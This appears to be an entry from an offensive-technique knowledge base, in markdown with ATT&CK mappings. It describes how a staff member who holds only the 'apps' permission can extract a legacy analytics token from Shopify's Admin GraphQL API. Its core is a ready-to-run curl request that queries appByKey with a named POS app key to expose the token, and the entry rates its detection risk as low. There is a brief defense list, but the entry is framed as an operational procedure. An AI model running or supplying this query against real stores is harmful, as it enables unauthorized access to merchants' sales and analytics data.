---
tags:
  - shopify
  - graphql
  - token-extraction
  - permission-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/graphql-query-extract-analytics-token]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:28:44.306Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 56e1964e-9c3e-4c18-8a3c-3468fd06314d
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Extract-Shopify-Analytics-Token-via-GraphQL

## Summary

This procedure exploits a permission bypass in Shopify's GraphQL API, allowing a staff member with only 'apps' permission to query the appByKey endpoint and extract the legacyEasdkAnalyticsToken from an installed app, enabling further unauthorized access to analytics data.

## Description

In Shopify's ecosystem, apps can embed analytics tokens for legacy EASDK functionality. The vulnerability stems from the legacyEasdkAnalyticsToken field being accessible via the 'apps' permission scope without requiring 'dashboard' or 'reports' scopes. An attacker with limited staff access can target an app installation (e.g., the POS app) using its API key to retrieve this token. This token grants read access to store analytics, such as sales reports, via the external analytics.shopify.com service. Prerequisites include a valid staff session and knowledge of an app's API key.

## Requirements

1. Shopify staff account with 'apps' permission (no 'dashboard' or 'reports' needed).
2. API key of an installed app with embedded analytics (e.g., 'a53cf2ce9b5dabf5dd222b3615c29569' for POS app).
3. Access to Shopify Admin GraphQL API endpoint (e.g., https://your-shop.myshopify.com/admin/api/2023-10/graphql.json).
4. HTTP client like curl for sending authenticated requests.

## Defense

Defensive measures and detection strategies:

- Enforce strict permission scoping in GraphQL resolvers to require 'reports' access for token fields.
- Monitor GraphQL queries for unusual appByKey usage with apps-only tokens.
- Log and alert on access to legacyEasdkAnalyticsToken from non-analytics scopes.
- Deprecate or secure legacy EASDK tokens in app installations.

## Objectives

1. Retrieve the embedded analytics token without proper permissions.
2. Enable subsequent queries to sensitive analytics data.
3. Demonstrate access control weakness in Shopify's API.

## Instructions

### Step 1: Authenticate and Prepare Query

**Context**: Obtain a staff access token and construct the GraphQL query targeting the appByKey endpoint with the specified API key.

**Command** ([[commands/graphql-query-extract-analytics-token]]):
```bash
curl -X POST 'https://your-shop.myshopify.com/admin/api/2023-10/graphql.json' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: your_staff_token' \
  -d '{"operationName":"EmbeddedAppAnalyticsToken","variables":{"apiKey":"a53cf2ce9b5dabf5dd222b3615c29569"},"query":"query EmbeddedAppAnalyticsToken($apiKey:String!){appByKey:appByKey(apiKey:$apiKey){id installation{id legacyEasdkAnalyticsToken typename}}"}'
```

> This command sends a POST request to the GraphQL endpoint with the query that selects the installation's legacyEasdkAnalyticsToken. Expected output is a JSON object like {"data":{"appByKey":{"installation":{"legacyEasdkAnalyticsToken":"eyJ..."}}}}. If successful, the token is exposed despite permission limits.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/graphql-query-extract-analytics-token]]

## Tools Used


## Tags

- shopify
- graphql
- permission-bypass
